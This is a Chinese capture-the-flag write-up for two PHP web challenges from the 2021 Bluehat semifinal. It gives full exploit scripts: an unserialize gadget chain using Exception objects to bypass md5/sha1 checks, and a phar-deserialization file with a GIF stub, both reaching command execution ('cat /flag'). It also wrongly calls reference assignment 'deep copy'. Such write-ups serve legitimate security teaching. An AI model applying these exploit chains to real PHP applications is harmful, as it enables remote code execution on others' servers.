# 2021 Bluehat Semifinal web wp
## 0x01 杰克爱罗斯

进入容器发现是php文件，获取源码如下：

```
<?php
highlight_file(__file__);

class Jack
{
    private $action;


    function __set($a, $b)
    {
        $b->$a();

    }

}

class Love {

    public $var;
    function __call($a,$b)
    {
        $rose = $this->var;
        call_user_func($rose);
    }

    private function action(){
        echo "jack love rose";
    }

}
class Titanic{
    public $people;
    public $ship;
    function __destruct(){

        $this->people->action=$this->ship;
    }
}
class Rose{
    public $var1;
    public $var2;
    function __invoke(){
        if( ($this->var1 != $this->var2) && (md5($this->var1) === md5($this->var2)) && (sha1($this->var1)=== sha1($this->var2)) ){
            eval($this->var1);
        }
    }
}

if(isset($_GET['love'])){
    $sail=$_GET['love'];
    unserialize($sail);
}
?>
```

* ### 知识扩展1：php魔术方法

```
__construct() -> 在创建类对象时自动调用
__destruct() -> 在销毁类对象时自动调用（在php结束时自动销毁类对象）
__wakeup() -> 在反序列化类对象时自动调用
__set($name, $value) -> 在尝试为类对象中无法访问的变量进行赋值时调用，$name为相应的无法访问的变量，$value为相应的将要为该变量赋的值
__get($name) -> 在尝试访问类对象中无法访问的变量时进行调用，$name为相应的无法访问的变量
__toString() -> 在尝试输出类对象时调用的函数，直接将对象转化为String类型
__call() -> 在尝试从外部调用一个私有类函数时触发的方法
__invoke() -> 在尝试用函数调用方式调用类对象时触发的方法
```

由于源码可知，需要通过`Titanic->Jack->Love->Rose`的调用方式进行调用，通过`Titanic`类中的`people->action`触发`Jack`类中的`__set`方法，从而通过调用`action()`触发`Love`类中的`__call`方法，以函数调用方式调用`Rose`类对象，触发`Rose`类对象中的`__invoke`方法，从而到达命令执行函数`eval`。

* ### 知识扩展2：通过php原生类`Exception`绕过md5与sha1检测
在php中，当对两个`Exception`类对象进行md5和sha1加密时，由于`Exception`类中的`__toString`魔术方法，当加密时仅会加密其message部分，而后面的部分会被忽略，因而可以通过该技巧绕过md5和sha1加密。

exp：

```
<?php

class Jack
{
    private $action=1;


    function __set($a, $b)
    {
        $b->$a();

    }

}

class Love {

    public $var;
    function __call($a,$b)
    {
        $rose = $this->var;
        call_user_func($rose);
    }

    private function action(){
        echo "jack love rose";
    }

}
class Titanic{
    public $people;
    public $ship;
    function __destruct(){

        $this->people->action=$this->ship;
    }
}
class Rose{
    public $var1;
    public $var2;
    function __invoke(){
        }
}

$str = "?><?php eval(system('cat /flag'));?>";
$a = new Exception($str,1);$b = new Exception($str,2);
$exp = new Titanic;
$exp->people = new Jack;
$exp2 = new Love;
$exp2->var = new Rose();
$exp2->var->var1 = $a;
$exp2->var->var2 = $b;
$exp->people->action = $exp2;
$exp->ship = $exp2;
echo urlencode(serialize($exp));
?>
```



## 0x02 不一样的web

进入平台发现文件上传，在网页源码提示中又观察到了两个类对象`Test`和`Read`，推测是phar反序列化漏洞。观察到源码类中有文件读取`lib.php`，构造exp读取`lib.php`：

readlib.php

```
<?php

class Read{
    public $name;
    public function file_get()
    {
        $text = base64_encode(file_get_contents("lib.php"));
        echo $text;
    }
}
class Test{
    public $f;
    public function __construct($value){
        $this->f = $value;
    }

    public function __wakeup()
    {
        $func = $this->f;
        $func();
    }
}

    $phar = new Phar('phar.phar');
    $phar -> startBuffering();
    $phar -> setStub('GIF89a'.'<?php __HALT_COMPILER();?>');
    $b = Array('Read','file_get');
    $a = new Test($b);
    $phar -> setMetadata($a);
    $phar -> addFromString('test.txt','test');
    $phar -> stopBuffering();
?>
```



lib.php

```
<?php
error_reporting(0);
class Modifier{
	public $old_id;
	public $new_id;
	public $p_id;
	public function __construct(){
		$this->old_id = "1";
		$this->new_id = "0";
		$this->p_id = "1";
	}
	public function __get($value){
		$new_id = $value;
		$this->old_id = random_bytes(16);
		if($this->old_id===$this->new_id){
			system($this->p_id);
		}
	}
}
class Read{
    public function file_get()
    {
        $text = base64_encode(file_get_contents("lib.php"));
        echo $text;
    }

}
class Files{
	public $filename;
	public function __construct($filename){
		$this->filename = $this->FilesWaf($filename);
	}
	public function __wakeup(){
		$this->FilesWaf($this->filename);
	}
	public function __toString(){
		return $this->filename;
	}
	public function __destruct(){
		echo "Your file is ".$this->FilesWaf($this->filename).".</br>";
		
	}
	public function FilesWaf($name){
		if(stristr($name, "/")!==False){
			return "index.php";
		}
		return $name;
	}
}
class Test{
    public $f;
    public function __construct($value){
        $this->f = $value;
    }

    public function __wakeup()
    {
		$func = $this->f;
        $func();
    }
}
class User{
	public $name;
	public $profile;
	public function __construct($name){
		$this->name = $this->UserWaf($name);
		$this->profile = "I am admin.";
	}
	public function __wakeup(){
		$this->UserWaf($this->name);
	}
	public function __toString(){
		return $this->profile->name;
	}
	public function __destruct(){
		echo "Hello ".$this->UserWaf($this->name).".</br>";
		
	}
	public function UserWaf($name){
		if(strlen($name)>10){
			return "admin";
		}
		if(!preg_match("/[a-f0-9]/iu",$name)){
			return "admin";
		}
		return $name;
	}
}
```

观察到类`Modifier`中存在`system`函数即命令执行，则需要通过`__get`魔术方法来调用`Modifier`类从而触发命令执行。

而观察到`User`类中存在`__toString`魔术方法，而且调用了一个并不存在的参数，因而可以通过`User`类的`__toString`方法调用`Modifier`的`__get`方法从而到达`Modifier`方法。

而在`Modifier`方法中存在一个`random_bytes()`函数，使得无法构造常规的`new_id()`达到与`old_id()`相同的效果，因而采用深浅拷贝的方式。

浅拷贝：诸如`$a = $b`，即将b的值赋值给a，而当b改变时a并不改变

深拷贝：诸如`$a = &$b`，即将b的地址赋值给a，即a指向b的地址，当b改变时由于a指向的值发生了改变，a也相应地发生改变。

因而最终exp如下：

```
<?php

class Modifier{
	public $old_id;
	public $new_id;
	public $p_id;
	public function __construct(){
		$this->old_id = "1";
		$this->new_id = "0";
		$this->p_id = "cat /flag";
	}
	public function __get($value){
	}
}

class User{
	public $name;
	public $profile;
	public function __construct($name){
		$this->name = $this->UserWaf($name);
		$this->profile = "I am admin.";
	}
	public function __wakeup(){
		$this->UserWaf($this->name);
	}
	public function __toString(){
		return $this->profile->name;
	}
	public function __destruct(){
		echo "Hello ".$this->UserWaf($this->name).".</br>";
		
	}
	public function UserWaf($name){
		if(strlen($name)>10){
			return "admin";
		}
		if(!preg_match("/[a-f0-9]/iu",$name)){
			return "admin";
		}
		return $name;
	}
}

$phar = new Phar('phar.phar');
$phar -> startBuffering();    
$phar -> setStub('GIF89a'.'<?php __HALT_COMPILER();?>');
$a = new User("abb");
$b = new User("bcc");
$exp = new Modifier;
$a -> name = &$b;
$exp->new_id = &$exp->old_id;
$b -> profile = &$exp;
$phar -> setMetadata($a);
$phar -> addFromString('test.txt','test');
$phar -> stopBuffering();

?>

```

